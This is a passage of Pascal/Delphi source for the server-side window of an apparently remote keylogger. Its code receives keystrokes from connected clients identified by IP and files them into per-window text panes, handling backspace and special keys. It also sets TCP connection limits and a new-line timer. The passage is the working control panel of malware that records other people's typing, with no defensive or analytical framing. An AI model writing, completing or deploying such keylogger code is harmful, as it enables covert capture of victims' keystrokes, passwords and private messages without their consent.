  for i:=0 to ConnectionTabs.Tabs.Count-1 do
  begin
    if (ConnectionTabs.Tabs[i] = tabName) then
    begin
      tabWithNameIndx := i;
      break;
    end;
  end;

  if (tabWithNameIndx = -1) then
  begin
    exit;
  end;

  ConnectionTabs.Tabs.Delete(tabWithNameIndx);
  DeleteTab(ClientTabsArray, tabWithNameIndx);

  // if the tab that we've removed has been the tab that we've been looking at, let's set the currVisibleIndx to tabWithNameIndx+1

  if (ConnectionTabs.Tabs.Count > 0) then
  begin
    ConnectionTabs.OnChange(ConnectionTabs);
  end
  else
  begin
    currVisibleClientTab := -1;
  end;
end;

procedure TServerSideForm.AddStrToCorrectTab(tabName: wideString; str: wideString; needNewLine: boolean; windowName: wideString);
var
  i,j: longInt;
  tempHint: wideString;
begin

  // go through all avaliable memos, and check their names to see if we already been key loging that particular window
  // (each memo has a name corresponding to the window it's assosiated with)

  //ServerSideForm.LogToForm('Looking for input window ' + windowName + ' in ' + tabName + '. Trying to add ' + str);
  for i:=0 to Length(ClientTabsArray)-1 do
  begin
    if (ClientTabsArray[i].ClientIP = tabName) then
    begin
      for j:=0 to Length(ClientTabsArray[i].WindowMemos)-1 do
      begin
        tempHint := wideString(ClientTabsArray[i].WindowMemos[j].Hint);

        if (tempHint = windowName) then
        begin
          // add to memo and exit
          if (Int64(str[1]) = VK_BACK) then
          begin
            //ClientTabsArray[i].WindowMemos[j].
            ClientTabsArray[i].CurrInputStr := Copy(ClientTabsArray[i].CurrInputStr, 1, Length(ClientTabsArray[i].CurrInputStr)-1);
          end
          else
          begin
            if (Length(str) = 1) then
            begin
              // regular character
              InsertFontText(ClientTabsArray[i].WindowMemos[j], str, RegularTextFont);
            end
            else
            begin
              // special str
              InsertFontText(ClientTabsArray[i].WindowMemos[j], str, SpecialTextFont);
            end;

            ClientTabsArray[i].CurrInputStr := ClientTabsArray[i].CurrInputStr + str;
          end;

          exit;
        end;
      end;

      // if memo was not found, we need to add a new memo with the name of windowName
      // add it and add the str
      ClientTabsArray[i].AddMemo(windowName);

      if (Length(str) = 1) then
      begin
        // regular character
        InsertFontText(ClientTabsArray[i].WindowMemos[Length(ClientTabsArray[i].WindowMemos)-1], str, RegularTextFont);
      end
      else
      begin
        // special str
        InsertFontText(ClientTabsArray[i].WindowMemos[Length(ClientTabsArray[i].WindowMemos)-1], str, SpecialTextFont);
      end;
      ClientTabsArray[i].CurrInputStr := ClientTabsArray[i].CurrInputStr + str;

    end;
  end;
end;













 // LOG FORM

procedure TServerSideForm.ClearLogItemClick(Sender: TObject);
begin
  LogText.Text:='';
end;

procedure TServerSideForm.LogToForm(str: wideString);
begin
  LogText.Lines.Append(DateTimeToStr(Now) + ':  ' + str);
end;









// SETTINGS FORM

procedure TServerSideForm.ApplyButtonClick(Sender: TObject);
var
  i,j: longInt;
begin
  // apply interval, font settings, maxConnections
  ServerSideForm.NewLineTimer.Interval := StrToInt(NewLineIntervalEdit.Text) * 1000;
  TCPServer.MaxConnections := StrToInt(MaxConnectionsEdit.Text);
end;

procedure TServerSideForm.KeystrokeAreaBarChange(Sender: TObject);
var
  i, j: longInt;
begin
  // change anchor gap between all memos
  for i:=0 to Length(ClientTabsArray)-1 do
  begin
    for j:=0 to Length(ClientTabsArray[i].WindowMemos)-1 do
    begin
      ClientTabsArray[i].WindowMemos[j].Height := KeystrokeAreaBar.Position;
    end;
  end;
end;

procedure TServerSideForm.MaxConnectionsEditChange(Sender: TObject);
begin
  if (StrToInt(MaxConnectionsEdit.Text) < Length(ServerSideForm.ClientTabsArray)) then
  begin
    MaxConnectionsEdit.Text := IntToStr(Length(ServerSideForm.ClientTabsArray));
  end;
end;

procedure TServerSideForm.NewLineIntervalEditChange(Sender: TObject);
begin
  if (StrToInt(NewLineIntervalEdit.Text) < 5) then
  begin
    NewLineIntervalEdit.Text := '5';
  end;
end;

procedure TServerSideForm.WindowGapBarChange(Sender: TObject);
var
  i, j: longInt;
begin
  // change anchor gap between all memos
  for i:=0 to Length(ClientTabsArray)-1 do
  begin
    for j:=0 to Length(ClientTabsArray[i].WindowMemos)-1 do
    begin
      ClientTabsArray[i].WindowMemos[j].BorderSpacing.Top := WindowGapBar.Position;
    end;
  end;
end;








// CONNECTIONS FORM


//




end.

